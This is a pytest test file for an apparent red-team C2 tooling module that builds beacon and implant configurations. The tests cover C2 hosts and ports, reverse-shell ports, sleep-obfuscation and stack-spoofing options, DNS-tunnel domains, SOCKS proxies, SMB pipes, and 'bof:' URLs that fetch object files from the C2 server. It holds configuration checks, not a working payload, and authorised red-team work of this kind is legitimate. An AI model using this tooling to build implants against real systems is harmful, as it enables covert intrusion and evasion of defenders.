"""Tests for modules/beacon_config_builder.py — BeaconConfig, BeaconConfigBuilder,
and generate_bof_execution_command.

Covers:
    - BeaconConfig default construction and serialization
    - to_gen_beacon_args produces correct CLI flags
    - to_go_implant_vars produces template dict for Go implant
    - to_config_json produces valid config.json structure
    - BeaconConfigBuilder.build from payload dict
    - generate_bof_execution_command produces correct bof: URL
"""

from __future__ import annotations

from modules.beacon_config_builder import (
    BeaconConfig,
    BeaconConfigBuilder,
    generate_bof_execution_command,
)


class TestBeaconConfig:
    def test_default_construction(self):
        cfg = BeaconConfig()
        assert cfg.name == "beacon"
        assert cfg.c2_port == 4444
        assert cfg.sleep_base_ms == 6000
        assert cfg.min_jitter_pct == 30
        assert cfg.max_jitter_pct == 60
        assert cfg.max_retries == 3
        assert cfg.tls_enabled is True
        assert cfg.stealth_mode is True
        assert cfg.sleep_obfuscation_enabled is False
        assert cfg.socks_proxy_enabled is False

    def test_to_gen_beacon_args(self):
        cfg = BeaconConfig(
            name="test_beacon",
            c2_url="https://10.0.0.1:443",
            malleable_route="/api/v1/users/",
            client_id="test_beacon",
            c2_host="10.0.0.1",
            c2_port=443,
            aes_key_hex="a" * 64,
            user_agent="TestAgent/1.0",
            output_binary="test.exe",
        )
        args = cfg.to_gen_beacon_args()
        assert "--url=https://10.0.0.1:443" in args
        assert "--maleable=/api/v1/users/" in args
        assert "--client-id=test_beacon" in args
        assert "--c2-host=10.0.0.1" in args
        assert "--c2-port=443" in args
        assert "--user-agent=TestAgent/1.0" in args
        assert "--output=test.exe" in args
        for arg in args:
            assert arg.startswith("--")

    def test_to_go_implant_vars(self):
        cfg = BeaconConfig(
            client_id="linux_01",
            c2_host="10.0.0.1",
            c2_port=4444,
            malleable_route="/api/",
            aes_key_hex="b" * 64,
            user_agent="Chrome/120",
            sleep_base_ms=5000,
            sleep_obfuscation_enabled=True,
            sleep_obfuscation_technique="ekko",
            socks_proxy_enabled=True,
            socks_bind_port=1080,
        )
        vars_ = cfg.to_go_implant_vars()
        assert vars_["lhost"] == "10.0.0.1"
        assert vars_["lport"] == "4444"
        assert vars_["line"] == "linux_01"
        assert vars_["maleable"] == "/api/"
        assert vars_["key"] == "b" * 64
        assert vars_["sleep"] == "5"
        assert vars_["sleep_obfuscation"] == "True"
        assert vars_["sleep_technique"] == "ekko"
        assert vars_["socks_enabled"] == "True"
        assert vars_["socks_bind_port"] == "1080"

    def test_to_config_json(self):
        cfg = BeaconConfig(
            c2_host="192.168.1.1",
            reverse_shell_port=7777,
            beacon_scan_ports=[80, 443, 8080],
            enable_debug=True,
            sleep_obfuscation_enabled=True,
            sleep_obfuscation_technique="sleep_mask",
            sleep_detection_resistance=65,
            socks_proxy_enabled=True,
            socks_bind_address="0.0.0.0",
            socks_bind_port=9050,
            dns_enabled=True,
            dns_domain="tunnel.c2.com",
            websocket_enabled=True,
        )
        config_json = cfg.to_config_json()
        assert config_json["reverse_shell_port"] == 7777
        assert config_json["rhost"] == "192.168.1.1"
        assert config_json["enable_c2_implant_debug"] == "True"
        assert config_json["sleep_technique"] == "sleep_mask"
        assert config_json["sleep_detection_resistance"] == 65
        assert config_json["socks_enabled"] is True
        assert config_json["socks_bind_port"] == 9050
        assert config_json["dns_enabled"] is True
        assert config_json["dns_domain"] == "tunnel.c2.com"
        assert config_json["websocket_enabled"] is True

    def test_to_dict_serialization(self):
        cfg = BeaconConfig(
            name="full_beacon",
            c2_url="https://10.10.14.1:8443",
            c2_port=8443,
            tls_enabled=True,
            tls_ja3_hash="abc123",
            sleep_obfuscation_enabled=True,
            sleep_obfuscation_technique="stack_spoof",
            socks_proxy_enabled=False,
            dns_enabled=True,
            websocket_enabled=True,
            smb_enabled=True,
            smb_pipe_name=r"\\\.\\pipe\\beacon",
        )
        d = cfg.to_dict()
        assert d["name"] == "full_beacon"
        assert d["tls"]["enabled"] is True
        assert d["tls"]["ja3_hash"] == "abc123"
        assert d["sleep_obfuscation"]["enabled"] is True
        assert d["sleep_obfuscation"]["technique"] == "stack_spoof"
        assert d["socks_proxy"]["enabled"] is False
        assert d["dns"]["enabled"] is True
        assert d["websocket"]["enabled"] is True
        assert d["smb"]["enabled"] is True
        assert d["smb"]["pipe_name"] == r"\\\.\\pipe\\beacon"


class TestBeaconConfigBuilder:
    def test_build_minimal(self):
        payload = {
            "rhost": "10.10.11.5",
            "lhost": "10.10.14.141",
            "c2_port": 4444,
            "line": "test01",
        }
        builder = BeaconConfigBuilder(payload)
        config = builder.build()
        assert config.name == "test01"
        assert config.client_id == "test01"
        assert config.c2_host == "10.10.14.141"
        assert config.c2_port == 4444
        assert "https://10.10.14.141:4444" in config.c2_url

    def test_build_with_malleable_route(self):
        payload = {
            "lhost": "10.0.0.1",
            "c2_port": 443,
            "c2_malleable_route": "/api/v2/data",
            "line": "win01",
            "aes_key": "ab" * 32,
        }
        builder = BeaconConfigBuilder(payload)
        config = builder.build()
        assert config.malleable_route == "/api/v2/data/"
        assert config.client_id == "win01"

    def test_build_injects_tls_from_payload(self):
        payload = {
            "lhost": "10.0.0.1",
            "c2_port": 443,
            "line": "tls_beacon",
            "aes_key": "cd" * 32,
            "c2_tls": {"enabled": True, "min_version": "1.3", "ja3_fingerprint_library": "firefox_120"},
        }
        builder = BeaconConfigBuilder(payload)
        config = builder.build()
        assert config.tls_enabled is True
        assert config.tls_min_version == "1.3"

    def test_build_injects_dns_from_payload(self):
        payload = {
            "lhost": "10.0.0.1",
            "c2_port": 443,
            "line": "dns_beacon",
            "aes_key": "ef" * 32,
            "c2_dns": {"enabled": True, "domain": "tunnel.c2.io", "encoding": "hex"},
        }
        builder = BeaconConfigBuilder(payload)
        config = builder.build()
        assert config.dns_enabled is True
        assert config.dns_domain == "tunnel.c2.io"
        assert config.dns_encoding == "hex"

    def test_build_falls_back_on_missing_engines(self):
        payload = {"lhost": "10.0.0.1", "c2_port": 443, "line": "safe"}
        builder = BeaconConfigBuilder(payload)
        config = builder.build()
        assert config.sleep_obfuscation_enabled is False
        assert config.socks_proxy_enabled is False


class TestGenerateBofExecutionCommand:
    def test_basic_bof_command(self):
        cmd = generate_bof_execution_command(
            "ldap_enum",
            "https://10.10.14.1:4444",
            "win01",
        )
        assert cmd == "bof:https://10.10.14.1:4444/download/bofs/ldap_enum"

    def test_bof_with_args(self):
        cmd = generate_bof_execution_command(
            "ldap_enum",
            "https://10.10.14.1:4444",
            "win01",
            args=["CORP.local", "dc01.corp.local"],
        )
        assert "CORP.local,dc01.corp.local" in cmd
        assert cmd.startswith("bof:")

    def test_custom_bofs_dir(self):
        cmd = generate_bof_execution_command(
            "whoami",
            "http://192.168.1.1:8080",
            "linux02",
            bofs_dir="custom/bofs",
        )
        assert "custom/bofs/whoami" in cmd
